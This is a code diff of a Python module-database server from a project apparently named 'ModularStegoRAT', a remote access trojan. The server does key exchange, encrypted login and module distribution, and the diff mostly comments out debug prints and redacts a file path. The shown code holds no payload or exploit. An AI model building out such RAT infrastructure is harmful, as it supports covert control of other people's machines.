@@ -15,8 +15,8 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 DATABASE_NAME = "ModuleDatabase.db"
 INCOMING_CONNECTION_HOST = "127.0.0.1"
 INCOMING_CONNECTION_PORT = 12345
-NUM_BYTES_PER_MODULE = 0 #TODO : Consider 3 instead - 2 provides 65536 which may not be highly scalable
-MODULE_STORAGE = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Database Module Storage"
+NUM_BYTES_PER_MODULE = 2
+MODULE_STORAGE = "C:\\Users\\..."
 
 def IncrementNonce(oldNonce : bytes, increment : int) -> bytes:
     oldNonceInt = int.from_bytes(oldNonce, byteorder="big")
@@ -60,12 +60,12 @@ def HandleClient(clientSocket : socket.socket):
         format=serialization.PublicFormat.UncompressedPoint
     )
 
-    print("DERIVED BOB")
+    #print("DERIVED BOB")
 
     bobTransmission = json.dumps({"Bob Public" : base64.b64encode(bobPublicBytes).decode()})
     clientSocket.send(bobTransmission.encode().ljust(1024, b"\0"))
 
-    print("SNET BOB")
+    #print("SNET BOB")
 
     aliceTransmission = json.loads(clientSocket.recv(1024).rstrip(b"\0").decode())
     alicePublicBytes = base64.b64decode(aliceTransmission["Alice Public"])
@@ -96,7 +96,7 @@ def HandleClient(clientSocket : socket.socket):
         password = aes.decrypt(IncrementNonce(seedNonce, 2), base64.b64decode(request["Password"]), None).decode()
         publicKeyBytes = aes.decrypt(IncrementNonce(seedNonce, 3), base64.b64decode(request["Public Key"]), None)
 
-        print(f"Type : {requestType} | {username} | {password} | {publicKeyBytes.hex()}")
+        #print(f"Type : {requestType} | {username} | {password} | {publicKeyBytes.hex()}")
 
         cursor.execute("SELECT * FROM recognisedUsers WHERE username = ?", (username, ))
         rows = cursor.fetchall()
@@ -347,7 +347,7 @@ def HandleClient(clientSocket : socket.socket):
             clientRequest = json.loads(clientRequest.decode())
             seedNonceIncrement += 1
             
-            print(clientRequest)
+            #print(clientRequest)
             
             if(clientRequest["Type"] == "CLOSE_SHOP"):
                 shopping = False
@@ -456,7 +456,7 @@ def HandleClient(clientSocket : socket.socket):
                         queue.append(dependency)
         
         modulesProcessedList = list(modulesProcessed)
-        print(f"Modules Processed List : {modulesProcessedList}")
+        #print(f"Modules Processed List : {modulesProcessedList}")
         
         #Transmitting the size information
         modulesSizeDict = dict()
